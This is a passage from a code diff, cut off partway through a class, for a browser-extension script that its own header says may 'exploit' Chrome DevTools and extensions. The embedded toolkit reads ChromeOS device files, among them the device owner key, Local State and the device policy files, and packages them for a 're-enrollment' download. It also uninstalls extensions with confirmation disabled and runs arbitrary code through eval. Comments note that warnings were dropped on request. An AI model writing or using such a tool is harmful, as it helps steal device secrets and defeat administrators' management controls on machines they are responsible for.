@@ -1,6 +1,6 @@
 /**
  * @fileoverview Script to interact with Chrome DevTools, extensions, and potentially exploit/debug them.
- * Warning: This script appears to perform actions that could be risky or relate to browser security mechanisms.
+ * Warning: This script performs actions that could be risky or relate to browser security mechanisms.
  * Use with extreme caution and understanding.
  */
 (function () {
@@ -17,11 +17,1080 @@
     const BROWSER_INIT_NAVIGATE_EVENT = 'browserInitNavigate';
     const UPDATER_WEBSOCKET_PLACEHOLDER = "ws://%%updaterurl%%"; // Placeholder for actual updater URL
 
-    // Placeholders - These would be replaced by a build process
-    const PLACEHOLDER_HTML_ENTRY = "%%HTMLENTRY%%";
-    const PLACEHOLDER_EXT_JS = "%%EXTJS%%";
-    const PLACEHOLDER_EXT_HTML = "%%EXTHTML%%";
-    const PLACEHOLDER_CHROME_PAYLOAD = "%%CHROMEPAYLOAD%%"; // Placeholder for payload executed via chrome.tabs.executeScript
+
+    // --- Placeholder Content Generation ---
+    // NOTE: This section would ideally be handled by a build process.
+    // We simulate it here using the previously generated code.
+
+    // 1. EXTJS (Base64 of the previous Advanced Toolkit JS)
+    const prevToolkitJS = `
+// Combined and Finalized JavaScript Code for Advanced Extension Toolkit
+
+// --- Error Handling (Simplified) ---
+window.onerror = function (message, source, lineno, colno, error) {
+    console.error("Error:", message, "at", source, lineno, ":", colno, error);
+    const errorDiv = document.getElementById('global-error-display');
+    if (errorDiv) {
+        errorDiv.textContent = \`Error: \${message}\`;
+        errorDiv.style.display = 'block';
+    } else {
+        // Fallback if UI isn't ready
+        console.error("UI not ready for error display:", message);
+    }
+    return true; // Suppress default browser handling
+};
+
+function displayGlobalError(message) {
+    const errorDiv = document.getElementById('global-error-display');
+    if (errorDiv) {
+        errorDiv.textContent = message;
+        errorDiv.style.display = 'block';
+    } else {
+         console.error("UI not ready for error display:", message);
+    }
+}
+
+function clearGlobalError() {
+     const errorDiv = document.getElementById('global-error-display');
+     if (errorDiv) errorDiv.style.display = 'none';
+}
+
+// --- Promise wrapper for Chrome APIs ---
+function chromePromise(apiFunction, ...args) {
+    return new Promise((resolve, reject) => {
+        try {
+            apiFunction(...args, (result) => {
+                if (chrome.runtime.lastError) {
+                    reject(new Error(chrome.runtime.lastError.message || 'Unknown Chrome API Error'));
+                } else {
+                    resolve(result);
+                }
+            });
+        } catch (error) {
+            reject(error); // Catch synchronous errors (e.g., API not available)
+        }
+    });
+}
+
+
+// --- Path Utilities ---
+function assertPath(path) {
+  if (typeof path !== 'string') {
+    throw new TypeError('Path must be a string. Received ' + JSON.stringify(path));
+  }
+}
+
+function normalizeStringPosix(path, allowAboveRoot) {
+  var res = '';
+  var lastSegmentLength = 0;
+  var lastSlash = -1;
+  var dots = 0;
+  var code;
+  for (var i = 0; i <= path.length; ++i) {
+    if (i < path.length)
+      code = path.charCodeAt(i);
+    else if (code === 47 /*/*/)
+      break;
+    else
+      code = 47 /*/*/;
+    if (code === 47 /*/*/) {
+      if (lastSlash === i - 1 || dots === 1) {
+        // NOOP
+      } else if (lastSlash !== i - 1 && dots === 2) {
+        if (res.length < 2 || lastSegmentLength !== 2 || res.charCodeAt(res.length - 1) !== 46 /*.*/ || res.charCodeAt(res.length - 2) !== 46 /*.*/) {
+          if (res.length > 2) {
+            var lastSlashIndex = res.lastIndexOf('/');
+            if (lastSlashIndex !== res.length - 1) {
+              if (lastSlashIndex === -1) {
+                res = '';
+                lastSegmentLength = 0;
+              } else {
+                res = res.slice(0, lastSlashIndex);
+                lastSegmentLength = res.length - 1 - res.lastIndexOf('/');
+              }
+              lastSlash = i;
+              dots = 0;
+              continue;
+            }
+          } else if (res.length === 2 || res.length === 1) {
+            res = '';
+            lastSegmentLength = 0;
+            lastSlash = i;
+            dots = 0;
+            continue;
+          }
+        }
+        if (allowAboveRoot) {
+          if (res.length > 0)
+            res += '/..';
+          else
+            res = '..';
+          lastSegmentLength = 2;
+        }
+      } else {
+        if (res.length > 0)
+          res += '/' + path.slice(lastSlash + 1, i);
+        else
+          res = path.slice(lastSlash + 1, i);
+        lastSegmentLength = i - lastSlash - 1;
+      }
+      lastSlash = i;
+      dots = 0;
+    } else if (code === 46 /*.*/ && dots !== -1) {
+      ++dots;
+    } else {
+      dots = -1;
+    }
+  }
+  return res;
+}
+
+function _format(sep, pathObject) {
+  var dir = pathObject.dir || pathObject.root;
+  var base = pathObject.base || (pathObject.name || '') + (pathObject.ext || '');
+  if (!dir) {
+    return base;
+  }
+  if (dir === pathObject.root) {
+    return dir + base;
+  }
+  return dir + sep + base;
+}
+
+const posix = {
+  // path.resolve([from ...], to)
+  resolve: function resolve() {
+    var resolvedPath = '';
+    var resolvedAbsolute = false;
+    var cwd; // Note: process.cwd() won't work in extension context
+
+    for (var i = arguments.length - 1; i >= -1 && !resolvedAbsolute; i--) {
+      var path;
+      if (i >= 0)
+        path = arguments[i];
+      else {
+         // Cannot reliably get CWD in extension, assume root '/'? Or throw error?
+         // For simplicity, let's assume root if no absolute path is given.
+         path = '/'; // Fallback assumption
+      }
+
+      assertPath(path);
+
+      if (path.length === 0) {
+        continue;
+      }
+
+      resolvedPath = path + '/' + resolvedPath;
+      resolvedAbsolute = path.charCodeAt(0) === 47 /*/*/;
+    }
+
+    resolvedPath = normalizeStringPosix(resolvedPath, !resolvedAbsolute);
+
+    if (resolvedAbsolute) {
+      if (resolvedPath.length > 0)
+        return '/' + resolvedPath;
+      else
+        return '/';
+    } else if (resolvedPath.length > 0) {
+      return resolvedPath; // Relative path result
+    } else {
+      return '.'; // Or maybe '/' depending on desired behavior without CWD
+    }
+  },
+
+  normalize: function normalize(path) {
+    assertPath(path);
+    if (path.length === 0) return '.';
+    var isAbsolute = path.charCodeAt(0) === 47 /*/*/;
+    var trailingSeparator = path.charCodeAt(path.length - 1) === 47 /*/*/;
+    path = normalizeStringPosix(path, !isAbsolute);
+    if (path.length === 0 && !isAbsolute) path = '.';
+    if (path.length > 0 && trailingSeparator) path += '/';
+    if (isAbsolute) return '/' + path;
+    return path;
+  },
+
+  isAbsolute: function isAbsolute(path) {
+    assertPath(path);
+    return path.length > 0 && path.charCodeAt(0) === 47 /*/*/;
+  },
+
+  join: function join() {
+    if (arguments.length === 0)
+      return '.';
+    var joined;
+    for (var i = 0; i < arguments.length; ++i) {
+      var arg = arguments[i];
+      assertPath(arg);
+      if (arg.length > 0) {
+        if (joined === undefined)
+          joined = arg;
+        else
+          joined += '/' + arg;
+      }
+    }
+    if (joined === undefined)
+      return '.';
+    return posix.normalize(joined);
+  },
+
+  relative: function relative(from, to) {
+    assertPath(from);
+    assertPath(to);
+    if (from === to) return '';
+    from = posix.resolve(from); // Resolves based on root assumption if needed
+    to = posix.resolve(to);
+    if (from === to) return '';
+    var fromStart = 1; for (; fromStart < from.length; ++fromStart) { if (from.charCodeAt(fromStart) !== 47 /*/*/) break; }
+    var fromEnd = from.length; var fromLen = fromEnd - fromStart;
+    var toStart = 1; for (; toStart < to.length; ++toStart) { if (to.charCodeAt(toStart) !== 47 /*/*/) break; }
+    var toEnd = to.length; var toLen = toEnd - toStart;
+    var length = fromLen < toLen ? fromLen : toLen;
+    var lastCommonSep = -1; var i = 0;
+    for (; i <= length; ++i) {
+      if (i === length) {
+        if (toLen > length) { if (to.charCodeAt(toStart + i) === 47 /*/*/) { return to.slice(toStart + i + 1); } else if (i === 0) { return to.slice(toStart + i); } }
+        else if (fromLen > length) { if (from.charCodeAt(fromStart + i) === 47 /*/*/) { lastCommonSep = i; } else if (i === 0) { lastCommonSep = 0; } }
+        break;
+      }
+      var fromCode = from.charCodeAt(fromStart + i); var toCode = to.charCodeAt(toStart + i);
+      if (fromCode !== toCode) break; else if (fromCode === 47 /*/*/) lastCommonSep = i;
+    }
+    var out = '';
+    for (i = fromStart + lastCommonSep + 1; i <= fromEnd; ++i) { if (i === fromEnd || from.charCodeAt(i) === 47 /*/*/) { if (out.length === 0) out += '..'; else out += '/..'; } }
+    if (out.length > 0) return out + to.slice(toStart + lastCommonSep);
+    else { toStart += lastCommonSep; if (to.charCodeAt(toStart) === 47 /*/*/) ++toStart; return to.slice(toStart); }
+  },
+
+  dirname: function dirname(path) {
+    assertPath(path);
+    if (path.length === 0) return '.';
+    var code = path.charCodeAt(0); var hasRoot = code === 47 /*/*/; var end = -1; var matchedSlash = true;
+    for (var i = path.length - 1; i >= 1; --i) { code = path.charCodeAt(i); if (code === 47 /*/*/) { if (!matchedSlash) { end = i; break; } } else { matchedSlash = false; } }
+    if (end === -1) return hasRoot ? '/' : '.'; if (hasRoot && end === 1) return '//'; return path.slice(0, end);
+  },
+
+  basename: function basename(path, ext) {
+    if (ext !== undefined && typeof ext !== 'string') throw new TypeError('"ext" argument must be a string');
+    assertPath(path);
+    var start = 0; var end = -1; var matchedSlash = true; var i;
+    if (ext !== undefined && ext.length > 0 && ext.length <= path.length) {
+      if (ext.length === path.length && ext === path) return '';
+      var extIdx = ext.length - 1; var firstNonSlashEnd = -1;
+      for (i = path.length - 1; i >= 0; --i) { var code = path.charCodeAt(i);
+        if (code === 47 /*/*/) { if (!matchedSlash) { start = i + 1; break; } }
+        else { if (firstNonSlashEnd === -1) { matchedSlash = false; firstNonSlashEnd = i + 1; }
+          if (extIdx >= 0) { if (code === ext.charCodeAt(extIdx)) { if (--extIdx === -1) { end = i; } }
+            else { extIdx = -1; end = firstNonSlashEnd; } } } }
+      if (start === end) end = firstNonSlashEnd; else if (end === -1) end = path.length;
+      return path.slice(start, end);
+    } else {
+      for (i = path.length - 1; i >= 0; --i) { if (path.charCodeAt(i) === 47 /*/*/) { if (!matchedSlash) { start = i + 1; break; } }
+        else if (end === -1) { matchedSlash = false; end = i + 1; } }
+      if (end === -1) return ''; return path.slice(start, end);
+    }
+  },
+
+  extname: function extname(path) {
+    assertPath(path);
+    var startDot = -1; var startPart = 0; var end = -1; var matchedSlash = true; var preDotState = 0;
+    for (var i = path.length - 1; i >= 0; --i) { var code = path.charCodeAt(i);
+      if (code === 47 /*/*/) { if (!matchedSlash) { startPart = i + 1; break; } continue; }
+      if (end === -1) { matchedSlash = false; end = i + 1; }
+      if (code === 46 /*.*/) { if (startDot === -1) startDot = i; else if (preDotState !== 1) preDotState = 1; }
+      else if (startDot !== -1) { preDotState = -1; } }
+    if (startDot === -1 || end === -1 || preDotState === 0 || (preDotState === 1 && startDot === end - 1 && startDot === startPart + 1)) { return ''; }
+    return path.slice(startDot, end);
+  },
+
+  format: function format(pathObject) { if (pathObject === null || typeof pathObject !== 'object') { throw new TypeError('The "pathObject" argument must be of type Object. Received type ' + typeof pathObject); } return _format('/', pathObject); },
+  parse: function parse(path) {
+    assertPath(path);
+    var ret = { root: '', dir: '', base: '', ext: '', name: '' }; if (path.length === 0) return ret;
+    var code = path.charCodeAt(0); var isAbsolute = code === 47 /*/*/; var start;
+    if (isAbsolute) { ret.root = '/'; start = 1; } else { start = 0; }
+    var startDot = -1; var startPart = 0; var end = -1; var matchedSlash = true; var i = path.length - 1; var preDotState = 0;
+    for (; i >= start; --i) { code = path.charCodeAt(i);
+      if (code === 47 /*/*/) { if (!matchedSlash) { startPart = i + 1; break; } continue; }
+      if (end === -1) { matchedSlash = false; end = i + 1; }
+      if (code === 46 /*.*/) { if (startDot === -1) startDot = i; else if (preDotState !== 1) preDotState = 1; }
+      else if (startDot !== -1) { preDotState = -1; } }
+    if (startDot === -1 || end === -1 || preDotState === 0 || (preDotState === 1 && startDot === end - 1 && startDot === startPart + 1)) { if (end !== -1) { if (startPart === 0 && isAbsolute) ret.base = ret.name = path.slice(1, end); else ret.base = ret.name = path.slice(startPart, end); } }
+    else { if (startPart === 0 && isAbsolute) { ret.name = path.slice(1, startDot); ret.base = path.slice(1, end); } else { ret.name = path.slice(startPart, startDot); ret.base = path.slice(startPart, end); } ret.ext = path.slice(startDot, end); }
+    if (startPart > 0) ret.dir = path.slice(0, startPart - 1); else if (isAbsolute) ret.dir = '/';
+    return ret;
+  },
+  sep: '/',
+  delimiter: ':',
+  win32: null, // Placeholder, not implemented
+  posix: null // Placeholder, this IS posix
+};
+posix.posix = posix; // Self-reference
+
+
+// --- File Reading (Attempt using fetch) ---
+const kFilesToPackage = [ // Files for the zip feature
+    "/var/lib/devicesettings/owner.key",
+    "/home/chronos/Local State"
+];
+
+async function readFile(path) {
+    // No warnings as requested
+    try {
+        const response = await fetch("file://" + path);
+        if (!response.ok) {
+            throw new Error(\`Fetch failed: \${response.status} \${response.statusText}\`);
+        }
+        return await response.arrayBuffer();
+    } catch (error) {
+        console.error(\`readFile failed for "\${path}":\`, error);
+        // Re-throw a simpler error for the UI handler
+        throw new Error(\`Could not read file "\${path}": \${error.message}\`);
+    }
+}
+
+async function findLastPolicyFile() {
+    const kDevicePolicy = "/var/lib/devicesettings/policy.";
+    let foundSomething = false;
+    let i = 0;
+    const maxChecks = 100; // Safety limit
+    while (i < maxChecks) {
+        const currentPath = kDevicePolicy + i;
+        try {
+            // console.log("Trying " + currentPath); // Optional debug logging
+            await readFile(currentPath); // Check if readable
+            foundSomething = true;
+        } catch (e) {
+            if (foundSomething) {
+                const lastGoodPath = kDevicePolicy + (i - 1);
+                // console.log("Found last policy file:", lastGoodPath); // Optional debug logging
+                return lastGoodPath;
+            }
+             // Stop if the first one fails or any non-consecutive one fails
+            break;
+        }
+        i++;
+    }
+    // If loop finished finding files up to the limit, return the last one found
+     if (foundSomething && i === maxChecks) {
+        return kDevicePolicy + (i - 1);
+     }
+    // console.log("Policy file search completed."); // Optional debug logging
+    return null; // Indicate not found or accessible
+}
+
+// --- UI Templates ---
+const uiTemplates = {
+    mainLayout: \`
+        <div id="global-error-display" style="color: red; background-color: #fee; padding: 10px; border: 1px solid red; display: none; margin-bottom: 15px; white-space: pre-wrap;"></div>
+        <h1>Advanced Extension Toolkit</h1>
+        <div id="app-container">
+            <!-- Sections will be injected here -->
+        </div>
+         <div id="notes-section" style="margin-top: 20px; padding-top: 10px; border-top: 1px solid #ccc; font-size: 0.9em; color: #555;">
+            <p>Use features like code evaluation and file access responsibly.</p>
+        </div>
+    \`,
+    management: \`
+        <div id="management-section" class="feature-section">
+            <h2>Extension Management</h2>
+            <input type="text" id="ext-search" placeholder="Search extensions..." style="width: calc(80% - 90px); margin-bottom: 10px; padding: 5px;">
+            <button id="report-csv-btn" title="Download extension list as CSV" style="padding: 5px 10px;">Report CSV</button>
+            <div id="ext-list-container" style="max-height: 400px; overflow-y: auto; border: 1px solid #ccc; padding: 5px; min-height: 50px;">
+                Loading...
+            </div>
+        </div>
+    \`,
+    scripting: \`
+        <div id="scripting-section" class="feature-section">
+            <h2>Scripting</h2>
+            <div>
+                <h3>Evaluate Code in Extension Context (using eval)</h3>
+                <textarea id="code-input" rows="6" style="width: 95%; font-family: monospace;"></textarea><br/>
+                <button id="code-evaluate">Evaluate</button>
+                <input type="text" id="save-script-name" placeholder="Script name" style="margin-left: 10px;">
+                <button id="save-script-btn">Save</button>
+                <select id="saved-scripts-dropdown" style="margin-left: 5px;">
+                    <option value="">Load Saved Script</option>
+                </select>
+                <button id="delete-script-btn" title="Delete selected saved script">Delete</button>
+                <pre id="eval-output" style="background-color: #eee; padding: 5px; margin-top: 5px; max-height: 100px; overflow-y: auto; border: 1px solid #ddd; white-space: pre-wrap; word-wrap: break-word;"></pre>
+            </div>
+            <div style="margin-top: 15px;">
+                <h3>Inject Content Script into Active Tab</h3>
+                <input type="text" id="content-script-url" placeholder="Optional URL pattern (e.g., https://*.example.com/*)" style="width: 60%">
+                <button id="inject-script-btn">Inject Example Script</button>
+            </div>
+        </div>
+    \`,
+    fileViewer: \`
+        <div id="file-viewer-section" class="feature-section">
+            <h2>File Content Viewer (Read-Only)</h2>
+            <input type="text" id="file-path-input" placeholder="Enter absolute file path..." style="width: calc(100% - 100px);">
+            <button id="view-file-btn">View File</button>
+            <div id="file-content-output" style="margin-top: 10px; border: 1px solid #ccc; padding: 10px; max-height: 400px; overflow: auto; background: #f8f8f8; min-height: 50px;">
+                Enter path and click view. File access may be restricted.
+            </div>
+        </div>
+    \`,
+     reenroll: \`
+         <div id="reenroll-section" class="feature-section">
+             <h2>Re-enrollment Data Package</h2>
+             <button id="forreenroll">Attempt Download Zip</button>
+             <p id="reenroll-status" style="font-size: 0.9em; margin-top: 5px; color: #333;"></p>
+         </div>
+    \`,
+    systemInfo: \`
+         <div id="system-info-section" class="feature-section">
+             <h2>System Information</h2>
+             <pre id="platform-info" style="background-color: #eee; padding: 5px; border: 1px solid #ddd; white-space: pre-wrap; word-wrap: break-word;"></pre>
+         </div>
+    \`
+};
+
+
+// --- Feature Modules ---
+
+class ExtensionManager {
+    constructor(containerId) {
+        this.container = document.getElementById(containerId);
+        this.allExtensions = [];
+        this.render();
+    }
+
+    render() {
+        this.container.innerHTML = uiTemplates.management;
+        this.listElement = this.container.querySelector('#ext-list-container');
+        this.searchInput = this.container.querySelector('#ext-search');
+        this.reportButton = this.container.querySelector('#report-csv-btn');
+
+        this.searchInput.addEventListener('input', () => this.displayExtensions());
+        this.reportButton.addEventListener('click', () => this.generateReport());
+        this.loadExtensions();
+    }
+
+    async loadExtensions() {
+        this.listElement.innerHTML = '<i>Loading extensions...</i>';
+        try {
+            this.allExtensions = await chromePromise(chrome.management.getAll);
+            this.allExtensions.sort((a, b) => a.name.localeCompare(b.name));
+            this.displayExtensions();
+        } catch (error) {
+            console.error("Error loading extensions:", error);
+            this.listElement.innerHTML = \`<span style="color:red;">Error loading extensions: \${error.message}</span>\`;
+            displayGlobalError(\`Failed to load extensions: \${error.message}\`);
+        }
+    }
+
+    displayExtensions() {
+        const searchTerm = this.searchInput.value.toLowerCase();
+        this.listElement.innerHTML = '';
+
+        const filteredExtensions = this.allExtensions.filter(ext =>
+            ext.id !== chrome.runtime.id &&
+            (ext.name.toLowerCase().includes(searchTerm) || ext.id.toLowerCase().includes(searchTerm))
+        );
+
+        if (filteredExtensions.length === 0) {
+            this.listElement.textContent = 'No extensions found' + (searchTerm ? ' matching search.' : '.');
+            return;
+        }
+
+        const table = document.createElement('table');
+        table.style.width = '100%';
+        table.style.borderCollapse = 'collapse';
+        table.innerHTML = \`<thead><tr style="text-align: left; border-bottom: 1px solid #ccc;">
+            <th style="padding: 4px;">Status</th>
+            <th style="padding: 4px;">Name</th>
+            <th style="padding: 4px;">ID</th>
+            <th style="padding: 4px;">Type</th>
+            <th style="padding: 4px;">Version</th>
+            <th style="padding: 4px;">Actions</th>
+           </tr></thead>\`;
+        const tbody = document.createElement('tbody');
+
+        filteredExtensions.forEach(ext => {
+            const row = tbody.insertRow();
+            row.style.borderBottom = '1px solid #eee';
+
+            const statusCell = row.insertCell(); statusCell.style.padding = '4px';
+            const statusToggle = document.createElement('button');
+            statusToggle.textContent = ext.enabled ? 'Enabled' : 'Disabled';
+            statusToggle.style.color = ext.enabled ? 'green' : 'grey';
+            statusToggle.style.cursor = 'pointer';
+            statusToggle.title = ext.mayDisable ? \`Click to \${ext.enabled ? 'disable' : 'enable'}\` : 'Cannot be changed';
+            statusToggle.disabled = !ext.mayDisable;
+            if (!ext.mayDisable) statusToggle.style.cursor = 'not-allowed';
+
+            statusToggle.addEventListener('click', async () => {
+                statusToggle.disabled = true; statusToggle.textContent = '...';
+                try {
+                    await chromePromise(chrome.management.setEnabled, ext.id, !ext.enabled);
+                    setTimeout(() => this.loadExtensions(), 200); // Refresh list
+                } catch (error) {
+                    console.error(\`Error toggling \${ext.id}:\`, error);
+                    displayGlobalError(\`Failed to toggle \${ext.name}: \${error.message}\`);
+                    setTimeout(() => this.loadExtensions(), 100); // Refresh even on error
+                }
+            });
+            statusCell.appendChild(statusToggle);
+
+            row.insertCell().textContent = ext.name;
+            row.insertCell().textContent = ext.id;
+            row.insertCell().textContent = ext.installType;
+            row.insertCell().textContent = ext.version;
+
+            const actionCell = row.insertCell(); actionCell.style.padding = '4px';
+            const uninstallButton = document.createElement('button');
+            uninstallButton.textContent = 'Uninstall';
+            uninstallButton.title = ext.mayDisable ? \`Uninstall \${ext.name}\` : 'Cannot uninstall';
+            uninstallButton.disabled = !ext.mayDisable;
+             if (!ext.mayDisable) uninstallButton.style.cursor = 'not-allowed';
+
+            uninstallButton.addEventListener('click', async () => {
+                 // No confirmation as requested implicitly by "don't worry"
+                 uninstallButton.disabled = true; uninstallButton.textContent = '...';
+                 try {
+                    await chromePromise(chrome.management.uninstall, ext.id, { showConfirmDialog: false }); // Use API confirmation=false
+                    setTimeout(() => this.loadExtensions(), 200);
+                 } catch(error) {
+                     console.error(\`Error uninstalling \${ext.id}:\`, error);
+                     displayGlobalError(\`Failed to uninstall \${ext.name}: \${error.message}\`);
+                      setTimeout(() => this.loadExtensions(), 100);
+                 }
+            });
+            actionCell.appendChild(uninstallButton);
+        });
+        table.appendChild(tbody);
+        this.listElement.appendChild(table);
+    }
+
+    generateReport() {
+        if (this.allExtensions.length === 0) return;
+        const header = "ID,Name,Version,Enabled,InstallType,MayDisable\\n";
+        const csvContent = header + this.allExtensions
+            .filter(ext => ext.id !== chrome.runtime.id)
+            .map(ext => [
+                \`"\${ext.id}"\`, \`"\${ext.name.replace(/"/g, '""')}"\`, \`"\${ext.version}"\`,
+                ext.enabled, \`"\${ext.installType}"\`, ext.mayDisable
+            ].join(','))
+            .join('\\n');
+
+        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+        const link = document.createElement("a");
+        link.href = URL.createObjectURL(blob);
+        link.download = \`chrome_extensions_report_\${Date.now()}.csv\`;
+        link.style.display = 'none';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        URL.revokeObjectURL(link.href); // Clean up blob URL
+    }
+}
+
+
+class ScriptingTool {
+    constructor(containerId) {
+        this.container = document.getElementById(containerId);
+        this.savedScripts = {};
+        this.render();
+    }
+
+    render() {
+        this.container.innerHTML = uiTemplates.scripting;
+        this.codeInput = this.container.querySelector('#code-input');
+        this.evalButton = this.container.querySelector('#code-evaluate');
+        this.saveNameInput = this.container.querySelector('#save-script-name');
+        this.saveButton = this.container.querySelector('#save-script-btn');
+        this.loadDropdown = this.container.querySelector('#saved-scripts-dropdown');
+        this.deleteButton = this.container.querySelector('#delete-script-btn');
+        this.outputPre = this.container.querySelector('#eval-output');
+        this.injectButton = this.container.querySelector('#inject-script-btn');
+        this.injectUrlInput = this.container.querySelector('#content-script-url');
+
+        this.evalButton.addEventListener('click', () => this.evaluateCodeDirect());
+        this.saveButton.addEventListener('click', () => this.saveScript());
+        this.loadDropdown.addEventListener('change', (e) => this.loadScript(e.target.value));
+        this.deleteButton.addEventListener('click', () => this.deleteScript());
+        this.injectButton.addEventListener('click', () => this.injectContentScript());
+
+        this.loadSavedScripts();
+    }
+
+    evaluateCodeDirect() {
+        const code = this.codeInput.value;
+        this.outputPre.textContent = ''; // Clear previous output
+        if (!code.trim()) {
+             this.outputPre.textContent = '// No code entered.';
+             return;
+        }
+        this.outputPre.textContent = '// Evaluating...';
+        try {
+            // Direct eval in the extension's context (popup)
+            // Capture return value and console logs if possible (basic)
+            let evalResult;
+            const logMessages = [];
+            const originalConsoleLog = console.log; // Store original
+            console.log = (...args) => { // Temporarily override console.log
+                 logMessages.push(args.map(arg => String(arg)).join(' ')); // Convert args to string
+                 originalConsoleLog.apply(console, args); // Still log normally
+            };
+
+            try {
+                evalResult = eval(code); // <<< Use eval as requested
+            } finally {
+                console.log = originalConsoleLog; // Restore original console.log
+            }
+
+            let outputText = '';
+            if (logMessages.length > 0) {
+                outputText += '// Console logs:\\n' + logMessages.join('\\n') + '\\n\\n';
+            }
+             outputText += '// Return value:\\n';
+            if (typeof evalResult === 'undefined') {
+                outputText += 'undefined';
+            } else {
+                 try {
+                    outputText += JSON.stringify(evalResult, null, 2); // Pretty print if possible
+                 } catch (stringifyError) {
+                      outputText += String(evalResult); // Fallback to string conversion
+                 }
+            }
+             this.outputPre.textContent = outputText;
+
+        } catch (error) {
+            console.error("Evaluation error:", error);
+            this.outputPre.textContent = \`// Evaluation Error:\\n\${error.stack || error.message}\`;
+        }
+    }
+
+
+    async loadSavedScripts() {
+        try {
+            const result = await chromePromise(chrome.storage.local.get, 'savedEvalScripts');
+            this.savedScripts = result.savedEvalScripts || {};
+            this.updateDropdown();
+        } catch (error) {
+            console.error("Error loading scripts:", error);
+            displayGlobalError("Could not load saved scripts.");
+        }
+    }
+
+    updateDropdown() {
+        this.loadDropdown.innerHTML = '<option value="">Load Saved Script</option>';
+        const names = Object.keys(this.savedScripts).sort(); // Sort names alphabetically
+        names.forEach(name => {
+             const option = document.createElement('option');
+             option.value = name;
+             option.textContent = name;
+             this.loadDropdown.appendChild(option);
+        });
+        this.deleteButton.disabled = !this.loadDropdown.value;
+    }
+
+    loadScript(name) {
+        if (name && this.savedScripts[name]) {
+            this.codeInput.value = this.savedScripts[name];
+            this.saveNameInput.value = name;
+        } else {
+             this.codeInput.value = '';
+             this.saveNameInput.value = '';
+        }
+         this.deleteButton.disabled = !name;
+    }
+
+    async saveScript() {
+        const name = this.saveNameInput.value.trim();
+        const code = this.codeInput.value;
+        if (!name) { displayGlobalError("Script name required."); return; }
+        if (!code.trim()) { displayGlobalError("Cannot save empty script."); return; }
+
+        const isOverwrite = this.savedScripts.hasOwnProperty(name);
+        // No confirmation for overwrite
+
+        this.savedScripts[name] = code;
+        try {
+            await chromePromise(chrome.storage.local.set, { savedEvalScripts: this.savedScripts });
+            this.updateDropdown();
+            this.loadDropdown.value = name; // Select the saved script
+             this.deleteButton.disabled = false;
+             displayGlobalError(\`Script "\${name}" \${isOverwrite ? 'updated' : 'saved'}.\`); // Simple status
+             setTimeout(clearGlobalError, 2000); // Clear status after a bit
+        } catch (error) {
+             console.error("Error saving script:", error);
+             displayGlobalError(\`Failed to save script "\${name}": \${error.message}\`);
+             // Revert local change on error? Complicates things, skip for now.
+        }
+    }
+
+     async deleteScript() {
+         const name = this.loadDropdown.value;
+         if (!name) return;
+         // No confirmation
+
+         delete this.savedScripts[name];
+         try {
+            await chromePromise(chrome.storage.local.set, { savedEvalScripts: this.savedScripts });
+            this.updateDropdown();
+            this.codeInput.value = '';
+            this.saveNameInput.value = '';
+            displayGlobalError(\`Script "\${name}" deleted.\`);
+             setTimeout(clearGlobalError, 2000);
+        } catch (error) {
+             console.error("Error deleting script:", error);
+             displayGlobalError(\`Failed to delete script "\${name}": \${error.message}\`);
+             // Revert local change?
+        }
+     }
+
+     async injectContentScript() {
+        const targetUrlPattern = this.injectUrlInput.value.trim();
+        // Simple example script
+        const funcToInject = (msg) => {
+             console.log('Injected:', msg, document.location.href);
+             document.body.style.outline = '5px dashed hotpink';
+             setTimeout(() => { document.body.style.outline = ''; }, 2500);
+        };
+        const argsToInject = ["Toolkit Script Injected!"];
+
+        try {
+             const [activeTab] = await chromePromise(chrome.tabs.query, { active: true, currentWindow: true });
+             if (!activeTab) { throw new Error("No active tab found."); }
+
+             const target = { tabId: activeTab.id };
+
+             // Basic URL pattern check if provided
+             if (targetUrlPattern) {
+                 let matches = false;
+                 try {
+                     // Basic wildcard matching
+                     const regexPattern = '^' + targetUrlPattern.replace(/[.+?^\${}()|[\]\\]/g, '\\\\$&').replace(/\\*/g, '.*') + '$';
+                     if (new RegExp(regexPattern).test(activeTab.url)) {
+                         matches = true;
+                     }
+                 } catch (e) { console.error("Invalid pattern?", e); } // Ignore invalid patterns for simplicity
+                  if (!matches) {
+                      displayGlobalError(\`Active tab URL does not match pattern. Skipped.\`);
+                      setTimeout(clearGlobalError, 3000);
+                      return;
+                  }
+             }
+
+             // Use chrome.scripting API (Requires "scripting" permission)
+             if (!chrome.scripting || !chrome.scripting.executeScript) {
+                 throw new Error("chrome.scripting API not available/permitted.");
+             }
+
+             await chromePromise(chrome.scripting.executeScript, {
+                 target: target,
+                 func: funcToInject,
+                 args: argsToInject,
+                 // world: 'MAIN' // Can be 'MAIN' or 'ISOLATED' (default)
+             });
+             displayGlobalError(\`Example script injected into active tab.\`);
+             setTimeout(clearGlobalError, 2000);
+
+         } catch (error) {
+             console.error("Error injecting script:", error);
+             displayGlobalError(\`Injection failed: \${error.message}\`);
+         }
+     }
+}
+
+class FileViewer {
+    constructor(containerId) {
+        this.container = document.getElementById(containerId);
+        this.render();
+        // Syntax highlighter (Prism) is omitted for pure JS focus, as requested
+    }
+
+     render() {
+         this.container.innerHTML = uiTemplates.fileViewer;
+         this.pathInput = this.container.querySelector('#file-path-input');
+         this.viewButton = this.container.querySelector('#view-file-btn');
+         this.outputDiv = this.container.querySelector('#file-content-output');
+
+         this.viewButton.addEventListener('click', () => this.displayFileContent());
+     }
+
+    async displayFileContent() {
+        const path = this.pathInput.value.trim();
+        this.outputDiv.textContent = ''; // Clear previous
+        if (!path) return;
+
+        this.outputDiv.innerHTML = '<i>Loading...</i>';
+        this.viewButton.disabled = true;
+
+        try {
+            const buffer = await readFile(path); // Uses global readFile
+            const textContent = new TextDecoder('utf-8', { fatal: false }).decode(buffer); // Decode as UTF-8, ignore errors
+
+            const pre = document.createElement('pre');
+             pre.style.whiteSpace = 'pre-wrap'; // Wrap long lines
+             pre.style.wordBreak = 'break-all'; // Break long words/tokens
+            pre.textContent = textContent;
+            this.outputDiv.innerHTML = '';
+            this.outputDiv.appendChild(pre);
+
+        } catch (error) {
+            console.error("Error viewing file:", error);
+            this.outputDiv.innerHTML = \`<span style="color: red;">Error: \${error.message}</span>\`;
+        } finally {
+            this.viewButton.disabled = false;
+        }
+    }
+}
+
+class ReEnrollmentPackager {
+     constructor(containerId) {
+        this.container = document.getElementById(containerId);
+        this.render();
+        this.loadJSZip(); // Start loading JSZip immediately
+    }
+
+     render() {
+        this.container.innerHTML = uiTemplates.reenroll;
+        this.packageButton = this.container.querySelector('#forreenroll');
